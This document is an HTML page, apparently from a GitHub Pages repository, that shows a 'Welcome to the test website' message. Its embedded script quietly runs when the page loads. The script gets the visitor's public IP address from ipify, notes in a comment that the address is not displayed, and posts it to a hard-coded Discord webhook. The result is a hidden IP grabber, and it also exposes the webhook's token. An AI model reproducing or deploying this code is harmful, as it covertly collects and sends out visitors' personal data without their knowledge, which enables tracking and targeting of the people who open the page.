# White-Fedora.github.io
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Website</title>
    <style>
        /* Global Styles */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            background: linear-gradient(to right, #56CCF2, #2F80ED); /* Gradient background */
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            color: white;
        }

        /* Container */
        .container {
            background: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
            border-radius: 10px;
            padding: 40px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
            max-width: 400px;
            width: 100%;
        }

        /* Heading Styles */
        h1 {
            font-size: 32px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        /* Text Styles */
        .message {
            font-size: 24px;
            font-weight: 500;
            color: #FFD700;
        }

        /* Fade-In Animation */
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Test Website</h1>
        <p class="message">Welcome to the test website</p>
    </div>

    <script>
        // Define the Discord Webhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1437669720944939122/KkFNvmFUEiEKV0S-QsiUHEWSOVQurwbNXOaTvinkjmVB5xDFbOgV8pN8s0HQ3MtajrA6';

        // Fetch IP address from ipify API (but don't display it)
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;

                // Send IP address to Discord automatically
                const payload = {
                    content: `My IP address is: ${ip}`
                };

                // Send POST request to Discord webhook
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log('IP address sent to Discord successfully');
                    } else {
                        console.error('Failed to send IP address to Discord');
                    }
                })
                .catch(error => {
                    console.error('Error sending IP address to Discord:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
            });
    </script>
</body>
</html>
